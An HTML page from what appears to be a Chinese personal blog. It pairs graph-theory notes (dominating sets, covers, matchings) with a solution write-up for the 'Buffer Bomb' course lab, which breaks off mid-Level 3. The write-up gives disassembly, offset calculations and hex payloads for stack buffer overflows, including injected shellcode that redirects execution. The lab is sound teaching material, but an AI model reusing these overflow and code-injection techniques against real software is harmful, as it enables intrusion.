            <a href="/2021/12/26/%E6%94%AF%E9%85%8D%E9%9B%86%E3%80%81%E8%A6%86%E7%9B%96%E9%9B%86%E3%80%81%E7%8B%AC%E7%AB%8B%E9%9B%86%E4%B8%8E%E5%8C%B9%E9%85%8D/" class="post-title-link" itemprop="url">支配集、覆盖集、独立集与匹配</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-26 19:09:08" itemprop="dateCreated datePublished" datetime="2021-12-26T19:09:08+08:00">2021-12-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-30 08:30:50" itemprop="dateModified" datetime="2021-12-30T08:30:50+08:00">2021-12-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="支配集"><a href="#支配集" class="headerlink" title="支配集"></a>支配集</h2><p>设图$G=<V,E>$是<strong>简单无向图</strong>，$S⊆V,S≠∅$，若对于$∀x∈V-S$，$x$都与$S$里至少一个顶点相邻，则称$S$是图$G$的<strong>支配集(dominating set)</strong>。</p>
<p>$S$是图$G$的支配集，若S的任何真子集都不是支配集，则称$S$为图$G$的<strong>极小支配集(minimal dominating set)</strong>。</p>
<p>$S$是图$G$的支配集，若不存在任何其它支配集$S’$，使得$|S’|＜|S|$，则称S是图G的<strong>最小支配集(smallest dominating set)</strong>。</p>
<p>若$S$是图$G$的最小支配集，则称$|S|$为图G的<strong>支配数(dominating number)</strong>，记作$γ(G)$。</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830190.png" alt="image-20211226191028465" style="zoom:50%;" /></p>
<p>例：在图中，$S_0=\{V_0\}，S=\{V_1,V_4,V_7\} ，S_2 =\{V_1,V_3,V_5,V_7\}$<br>都是G的<strong>支配集</strong>，且都是<strong>极小支配集</strong>，$S_0$是<strong>最小支配集</strong>， 因此$\gamma(G)=1$.</p>
<h3 id="极小支配集求法"><a href="#极小支配集求法" class="headerlink" title="极小支配集求法"></a>极小支配集求法</h3><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830191.png" alt="image-20211226234311068" style="zoom:80%;" /></p>
<h2 id="独立集"><a href="#独立集" class="headerlink" title="独立集"></a>独立集</h2><p>无向图$G=<V,E>$, $S⊆V$</p>
<p>独立集: $∀u,v∈S, (u,v)∉E$</p>
<p>极大独立集: $S$是独立集, 其真母集都不是</p>
<p>最大独立集: $|V*|$最大的独立集</p>
<p>独立数: $\beta_0(G)=|S|$, $S$是最大独立集</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830192.png" alt="image-20211226225521311" style="zoom:80%;" /></p>
<h3 id="极大独立集求法"><a href="#极大独立集求法" class="headerlink" title="极大独立集求法"></a>极大独立集求法</h3><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830193.png" alt="image-20211226235205099" style="zoom:80%;" /></p>
<h2 id="点覆盖"><a href="#点覆盖" class="headerlink" title="点覆盖"></a>点覆盖</h2><p>无向图$G=<V,E>$, $S⊆V$</p>
<p>点覆盖: $∀e∈E$,$ ∃v∈S$, $v$关联$e$</p>
<p>极小点覆盖: $S$是点覆盖, 其真子集都不是</p>
<p>最小点覆盖: $|S|$最小的点覆盖</p>
<p>点覆盖数: $\alpha_0(G)=|S|$, $S$是最小点覆盖</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830194.png" alt="image-20211226225543340" style="zoom:80%;" /></p>
<h3 id="极小点覆盖集求法"><a href="#极小点覆盖集求法" class="headerlink" title="极小点覆盖集求法"></a>极小点覆盖集求法</h3><p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830195.png" alt="image-20211226234826049" style="zoom:50%;" /></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830196.png" alt="image-20211226234810049" style="zoom:80%;" /></p>
<h2 id="边覆盖"><a href="#边覆盖" class="headerlink" title="边覆盖"></a>边覆盖</h2><p>n 无向图$G=<V,E>, E^*⊆E$</p>
<p>边覆盖: $∀v∈V, ∃e∈E^*, e$关联$v$</p>
<p>极小边覆盖: $E^*$是边覆盖, 其真子集都不是</p>
<p>最小边覆盖: $|E^*|$最小的边覆盖</p>
<p>边覆盖数: $\alpha_1(G)=|E^<em>|, E^</em>$是最小边覆盖</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830197.png" alt="image-20211226225904855" style="zoom:80%;" /></p>
<h2 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h2><p>无向图$G=<V,E>, E^*⊆E$</p>
<p>匹配(边独立集): $∀e,f ∈E^*, e,f$ 不相邻</p>
<p>极大匹配: $E^*$是匹配, 其真母集都不是</p>
<p>最大匹配: $|E^*|$最大的匹配</p>
<p>匹配数: $\beta_1(G)=|E^<em>|, E^</em>$是最大匹配</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112300830198.png" alt="image-20211226230137975" style="zoom:80%;" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/25/bufbomb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/25/bufbomb/" class="post-title-link" itemprop="url">the Buffer Bomb</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-25 16:10:08" itemprop="dateCreated datePublished" datetime="2021-12-25T16:10:08+08:00">2021-12-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-12-26 16:31:50" itemprop="dateModified" datetime="2021-12-26T16:31:50+08:00">2021-12-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="the-Buffer-Bomb"><a href="#the-Buffer-Bomb" class="headerlink" title="the Buffer Bomb"></a>the Buffer Bomb</h1><h2 id="事先准备"><a href="#事先准备" class="headerlink" title="事先准备"></a>事先准备</h2><ul>
<li><p><code>bufbomb</code>反汇编</p>
<p><code>objdump -d bufbomb &gt; asm.txt</code></p>
</li>
<li><p>获取自己的<code>cookie</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Userid: existo</span><br><span class="line">Cookie: 0x73413ee0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>要求在<code>getbuf</code>执行返回语句之前调用<code>smoke</code>函数，我们考虑利用缓冲区溢出的漏洞来修改<code>getbuf</code>函数的返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>观察汇编指令，发现分配给字符串的空间是从<code>%ebp - 0x32</code>开始的，<code>0x32</code>也就是<code>50</code>个字节，返回地址在<code>%ebp + 0x4</code>处，而<code>push %ebp</code>又占用<code>4</code>个字节，因此整个结构便有<code>0x32 + 0x4 + 0x4</code>一共<code>58</code>个字节，我们要做的是，将<code>smoke</code>函数的开始地址覆盖<code>getbuf</code>的最后<code>4</code>个字节的返回地址，这样执行完<code>getbuf</code>函数后就会跳转到我们想要的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048ba1 &lt;smoke&gt;:</span><br><span class="line"> 8048ba1:	55                   	push   %ebp</span><br><span class="line"> 8048ba2:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba4:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ba7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048baa:	68 30 a3 04 08       	push   $0x804a330</span><br><span class="line"> 8048baf:	e8 5c fd ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048bb4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bb7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bba:	6a 00                	push   $0x0</span><br><span class="line"> 8048bbc:	e8 fe 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bc4:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bc7:	6a 00                	push   $0x0</span><br><span class="line"> 8048bc9:	e8 52 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>观察到<code>smoke</code>函数的起始地址为<code>0x08048ba1</code>，因此我们将前<code>58 - 4 = 54</code>字节用任意值填满即可，最后<code>4</code>字节放上我们的<code>0x08048ba1</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*level 0*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">a1 8b 04 08</span><br></pre></td></tr></table></figure>
<p>储存为<code>level0.txt</code>文件，再使用提供的<code>hex2raw</code>程序转化为题目需要的<code>string</code></p>
<p><code>./hex2raw &lt; level0.txt &gt; level0-raw.txt</code></p>
<p>之后的题目都是这个办法，因此不再赘述(除了<code>level4</code>需要加<code>-n</code>)</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631615.png" alt="image-20211225165024232" style="zoom:80%;" /></p>
<p><code>level 0</code>得解</p>
<h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>要求和<code>level 0</code>类似，只不过这次要调用<code>fizz</code>函数，<code>fizz</code>函数需要输入一个参数，要求此参数是我们每个人独有的<code>cookie</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048bce &lt;fizz&gt;:</span><br><span class="line"> 8048bce:	55                   	push   %ebp</span><br><span class="line"> 8048bcf:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bd1:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bd4:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 8048bd7:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048bdc:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048bde:	75 22                	jne    8048c02 &lt;fizz+0x34&gt;</span><br><span class="line"> 8048be0:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048be3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048be6:	68 4b a3 04 08       	push   $0x804a34b</span><br><span class="line"> 8048beb:	e8 50 fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048bf0:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bf3:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bf6:	6a 01                	push   $0x1</span><br><span class="line"> 8048bf8:	e8 c2 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bfd:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c00:	eb 13                	jmp    8048c15 &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c02:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c05:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c08:	68 6c a3 04 08       	push   $0x804a36c</span><br><span class="line"> 8048c0d:	e8 2e fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c12:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c15:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c18:	6a 00                	push   $0x0</span><br><span class="line"> 8048c1a:	e8 01 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>可以观察到<code>fizz</code>函数的起始地址<code>0x08048bce</code>，与<code>level 0</code>相似我们首先还是需要覆盖<code>getbuf</code>的返回地址为<code>0x08048bce</code>，先保证调用<code>fizz</code>函数，<code>fizz</code>函数中将参数放在<code>0x8(%ebp)</code>位置，此<code>%ebp</code>为新<code>ebp</code>，既是<code>getbuf</code>返回地址处新<code>push</code>的<code>%ebp</code>，因此我们需要将<code>cookie</code>放在新<code>%ebp+0x8</code>位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*level 1*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">ce 8b 04 08 /*fizz地址*/</span><br><span class="line">00 00 00 00 /*%ebp+0x4*/</span><br><span class="line">e0 3e 41 73 /*%ebp+0x8处放cookie*/</span><br></pre></td></tr></table></figure>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631617.png" alt="image-20211225170427364" style="zoom:80%;" /></p>
<p><code>level 1</code>得解</p>
<h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>任务要求仍然是在<code>getbuf</code>执行返回语句之前调用其他函数，这次调用<code>bang</code>函数，并且要求将<code>global_value</code>设置成自己的<code>cookie</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048c1f &lt;bang&gt;:</span><br><span class="line"> 8048c1f:	55                   	push   %ebp</span><br><span class="line"> 8048c20:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c22:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c25:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c2a:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c2c:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048c31:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c33:	75 25                	jne    8048c5a &lt;bang+0x3b&gt;</span><br><span class="line"> 8048c35:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c3a:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c3d:	50                   	push   %eax</span><br><span class="line"> 8048c3e:	68 8c a3 04 08       	push   $0x804a38c</span><br><span class="line"> 8048c43:	e8 f8 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c48:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c4b:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c4e:	6a 02                	push   $0x2</span><br><span class="line"> 8048c50:	e8 6a 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048c55:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c58:	eb 16                	jmp    8048c70 &lt;bang+0x51&gt;</span><br><span class="line"> 8048c5a:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c5f:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c62:	50                   	push   %eax</span><br><span class="line"> 8048c63:	68 b1 a3 04 08       	push   $0x804a3b1</span><br><span class="line"> 8048c68:	e8 d3 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c6d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c70:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c73:	6a 00                	push   $0x0</span><br><span class="line"> 8048c75:	e8 a6 fc ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>注意到两个参数，一个<code>0x804d140</code>，一个<code>0x804d138</code>，我们需要知道哪个是<code>global_value</code></p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631618.png" alt="image-20211225172506382"></p>
<p>经过<code>gdb</code>调试发现<code>0x804d140</code>就是我们要修改的参数，所以我们的任务就是</p>
<ul>
<li>修改<code>global_value</code>为我们自己的<code>cookie</code></li>
<li>将<code>bang</code>函数起始地址<code>0x08048c1f</code>压栈</li>
<li><code>ret</code>指令执行<code>bang</code>函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, 0x804d140</span><br><span class="line">push $0x08048c1f</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>将汇编代码转化为机器码</p>
<p><code>gcc -c fun2.s</code></p>
<p><code>objdump -d fun2.o</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	c7 05 40 d1 04 08 e0 	movl   $0x73413ee0,0x804d140</span><br><span class="line">   7:	3e 41 73 </span><br><span class="line">   a:	68 1f 8c 04 08       	push   $0x8048c1f</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>问题来了，如何让程序执行我们的汇编代码，我们可以将<code>getbuf</code>的返回地址改为我们的代码的起始地址，这样程序就会执行我们的代码，修改变量并进入<code>bang</code>函数，那么首先我们得找出我们的函数的起始地址，肯定不是<code>0x00000000</code>，那么是啥呢，我们知道我们是通过字符串的溢出修改的代码，那么我们的字符串的首地址不就是我们的函数代码起始地址吗，知道了这个，我们只要找到字符串的首地址即可，从<code>getbuf</code>里找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>我们看到再调用<code>Gets</code>函数之前<code>push</code>了<code>%eax</code>，那么这个<code>%eax</code>就是字符串的首地址，也就是我们函数的起始地址，于是我们只要在调用<code>Gets</code>前设置一个断点，然后检查<code>%eax</code>的值即可</p>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631619.png" alt="image-20211225173935811"></p>
<p>所以我们<code>%eax</code>的值为<code>0x55682f5e</code>，既是我们函数的起始地址，覆盖<code>getbuf</code>的返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c7 05 40 d1 04 08 e0 </span><br><span class="line">3e 41 73 </span><br><span class="line">68 1f 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631620.png" alt="image-20211225175046375" style="zoom:80%;" /></p>
<p><code>level 2</code>得解</p>
<h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>任务要求正常调用<code>getbuf</code>，但是修改<code>getbuf</code>的返回值为我们的<code>cookie</code>(原本为<code>1</code>)，同时要求栈空间被还原，既复原<code>saved ebp</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048c7a &lt;test&gt;:</span><br><span class="line"> 8048c7a:	55                   	push   %ebp</span><br><span class="line"> 8048c7b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c7d:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048c80:	e8 48 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c85:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048c88:	e8 b5 06 00 00       	call   8049342 &lt;getbuf&gt;</span><br><span class="line"> 8048c8d:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048c90:	e8 38 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c95:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c97:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c9a:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c9c:	74 12                	je     8048cb0 &lt;test+0x36&gt;</span><br><span class="line"> 8048c9e:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048ca1:	68 d0 a3 04 08       	push   $0x804a3d0</span><br><span class="line"> 8048ca6:	e8 65 fc ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048cab:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cae:	eb 41                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cb0:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048cb3:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048cb8:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048cba:	75 22                	jne    8048cde &lt;test+0x64&gt;</span><br><span class="line"> 8048cbc:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048cbf:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048cc2:	68 f9 a3 04 08       	push   $0x804a3f9</span><br><span class="line"> 8048cc7:	e8 74 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048ccc:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048ccf:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048cd2:	6a 03                	push   $0x3</span><br><span class="line"> 8048cd4:	e8 e6 07 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048cd9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cdc:	eb 13                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cde:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ce1:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 